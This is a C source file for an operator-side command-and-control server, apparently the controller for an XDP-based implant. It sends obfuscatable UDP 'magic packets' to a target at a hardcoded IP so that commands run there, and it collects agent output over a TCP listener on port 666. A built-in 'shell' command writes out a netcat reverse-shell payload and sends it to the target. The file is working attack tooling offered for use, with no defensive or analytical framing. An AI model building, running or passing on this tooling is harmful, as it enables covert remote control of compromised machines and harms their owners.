// C2 Server - Operator-side command and control
// Compile: gcc c2_server.c -o c2_server -pthread
// Usage: ./c2_server

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define LISTEN_PORT 666
#define MAGIC_START "Phantom2025!"
#define MAGIC_END "END"
#define PAYLOAD_SIZE 200

typedef struct {
    int sock;
    struct sockaddr_in addr;
} client_info_t;

// XOR encoding for basic obfuscation
void xor_encode(char* data, int len, char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Generate magic packet with embedded command
void craft_magic_packet(const char* cmd, char* packet) {
    memset(packet, ' ', PAYLOAD_SIZE);  // Fill with spaces

    // Copy magic start
    memcpy(packet, MAGIC_START, strlen(MAGIC_START));

    // Copy command after magic start
    int cmd_start = strlen(MAGIC_START);
    int cmd_len = strlen(cmd);

    if (cmd_len > 80) cmd_len = 80;  // Safety limit
    memcpy(packet + cmd_start, cmd, cmd_len);

    // Place END marker
    int end_pos = cmd_start + cmd_len;
    memcpy(packet + end_pos, MAGIC_END, strlen(MAGIC_END));

    // XOR obfuscation (optional)
    // xor_encode(packet + cmd_start, cmd_len, 0x42);
}

// Send magic packet to target via UDP
void send_command(const char* target_ip, int target_port, const char* cmd) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[!] Socket creation failed\n");
        return;
    }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

    char packet[PAYLOAD_SIZE];
    craft_magic_packet(cmd, packet);

    sendto(sock, packet, PAYLOAD_SIZE, 0,
           (struct sockaddr*)&target_addr, sizeof(target_addr));

    close(sock);

    time_t now = time(NULL);
    printf("[%s] [>] Sent to %s:%d -> %s\n",
           strtok(ctime(&now), "\n"), target_ip, target_port, cmd);
}

// Thread to handle incoming output from agents
void* output_listener(void* arg) {
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

    int opt = 1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in listen_addr;
    memset(&listen_addr, 0, sizeof(listen_addr));
    listen_addr.sin_family = AF_INET;
    listen_addr.sin_addr.s_addr = INADDR_ANY;
    listen_addr.sin_port = htons(LISTEN_PORT);

    bind(listen_sock, (struct sockaddr*)&listen_addr, sizeof(listen_addr));
    listen(listen_sock, 5);

    printf("[*] Listening for agent output on port %d\n", LISTEN_PORT);

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);

        int client_sock = accept(listen_sock, (struct sockaddr*)&client_addr, &client_len);
        if (client_sock < 0) continue;

        // Receive output length
        int output_len;
        recv(client_sock, &output_len, sizeof(output_len), 0);

        if (output_len > 0 && output_len < 8192) {
            char* output = malloc(output_len + 1);
            recv(client_sock, output, output_len, 0);
            output[output_len] = '\0';

            time_t now = time(NULL);
            printf("\n[%s] [<] Output from %s:\n%s\n",
                   strtok(ctime(&now), "\n"),
                   inet_ntoa(client_addr.sin_addr),
                   output);
            printf("c2> ");
            fflush(stdout);

            free(output);
        }

        close(client_sock);
    }

    return NULL;
}

// Interactive shell
void interactive_mode() {
    char target_ip[64] = "192.168.75.133";
    int target_port = 80;

    printf("\n");
    printf("╔═══════════════════════════════════════╗\n");
    printf("║     XDP C2 Server - v1.0              ║\n");
    printf("║     Type 'help' for commands          ║\n");
    printf("╚═══════════════════════════════════════╝\n");
    printf("\n");
    printf("[*] Default target: %s:%d\n", target_ip, target_port);

    // Start output listener thread
    pthread_t listener_thread;
    pthread_create(&listener_thread, NULL, output_listener, NULL);
    pthread_detach(listener_thread);

    sleep(1);  // Let listener initialize

    char input[256];
    while (1) {
        printf("c2> ");
        fflush(stdout);

        if (fgets(input, sizeof(input), stdin) == NULL) break;

        // Strip newline
        input[strcspn(input, "\n")] = 0;

        if (strlen(input) == 0) continue;

        // Parse command
        if (strcmp(input, "help") == 0) {
            printf("\nCommands:\n");
            printf("  set target <ip> <port>  - Set target agent\n");
            printf("  exec <cmd>              - Execute command on target\n");
            printf("  shell <cmd>             - Reverse shell command shortcut\n");
            printf("  quit                    - Exit C2 server\n\n");
        }
        else if (strncmp(input, "set target ", 11) == 0) {
            sscanf(input + 11, "%s %d", target_ip, &target_port);
            printf("[*] Target set to %s:%d\n", target_ip, target_port);
        }
        else if (strncmp(input, "exec ", 5) == 0) {
            send_command(target_ip, target_port, input + 5);
        }
        else if (strncmp(input, "shell ", 6) == 0) {
            // Reverse shell helper
            char* c2_ip = input + 6;  // User provides C2 IP
            char shell_cmd[128];
            snprintf(shell_cmd, sizeof(shell_cmd),
                     "/bin/sh -i 2>&1|nc %s %d", c2_ip, LISTEN_PORT);
            send_command(target_ip, target_port, shell_cmd);
            printf("[*] Reverse shell command sent. Waiting for connection...\n");
        }
        else if (strcmp(input, "quit") == 0) {
            printf("[*] Exiting...\n");
            break;
        }
        else {
            printf("[!] Unknown command. Type 'help' for usage.\n");
        }
    }
}

int main() {
    interactive_mode();
    return 0;
}
